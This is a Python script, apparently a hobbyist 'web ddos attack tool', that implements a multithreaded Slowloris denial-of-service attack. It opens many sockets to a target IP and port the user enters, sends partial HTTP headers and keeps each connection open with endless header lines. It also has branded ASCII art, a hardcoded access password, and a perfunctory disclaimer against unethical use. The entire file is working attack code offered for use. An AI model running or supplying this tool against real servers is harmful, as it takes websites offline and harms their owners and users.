import socket
import threading
import time
import getpass

# Colored ASCII Art for "ADIRTTA" using '|_' style
def ascii_art_adirtta():
    print("""
\033[1;31m             ___    ____  ________  _______________\033[0m
\033[1;31m            /   |  / __ \/  _/ __ \/_  __/_  __/   |\033[0m
\033[1;36m           / /| | / / / // // /_/ / / /   / / / /| |    💀 code by adirtta 💀\033[0m
\033[1;35m          / ___ |/ /_/ // // _, _/ / /   / / / ___ |    THANK YOU FOR USING MY TOOL ❤>\033[0m
\033[1;32m         /_/  |_/_____/___/_/ |_| /_/   /_/ /_/  |_|    don't copy my tool ☺️🤗\033[0m
\033[1;34m      A web ddos attack tool. So do not use it for wrong and unethical activities\033[0m
""")


# Password authentication function
def authenticate():
    password = "ADi"  # The password to access the tool
    user_password = getpass.getpass(prompt="\033[1;36mEnter the password to access the tool: \033[0m")
    if user_password != password:
        print("\033[1;31mIncorrect password. Exiting...\033[0m")
        exit()


# Optimized Slowloris function with threading for faster execution
def slowloris_thread(target, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect((target, port))
        s.send(f"GET /? HTTP/1.1\r\nHost: {target}\r\nUser-Agent: Mozilla/5.0\r\n".encode())

        # Faster loop to send partial headers
        while True:
            s.send(b"X-a: b\r\n")
            time.sleep(0.01)  # Further reduced delay to make it faster
    except socket.error:
        print("\033[1;31mConnection error. Could not send data.\033[0m")
        return

def slowloris(target, port, num_threads):
    for i in range(num_threads):
        thread = threading.Thread(target=slowloris_thread, args=(target, port))
        thread.start()
        print(f"\033[1;33mSent love message {i + 1} 💌\033[0m")

if __name__ == "__main__":
    ascii_art_adirtta()  # Display the colorful ASCII art for 'ADIRTTA'

    authenticate()  # Authenticate after displaying ASCII art

    target = input("\033[1;36mEnter the target IP or domain: \033[0m")
    port = int(input("\033[1;36mEnter the port number: \033[0m"))
    num_threads = int(input("\033[1;36mEnter the number of threads (more = faster): \033[0m"))

    slowloris(target, port, num_threads)

    print(f"\033[1;31mThank you for using my tool\033[0m")

    print(f"\033[1;31mmy github id: github.com/ADIRTTA\033[0m")

    print(f"\033[1;31mpress ctrl + z\033[0m")
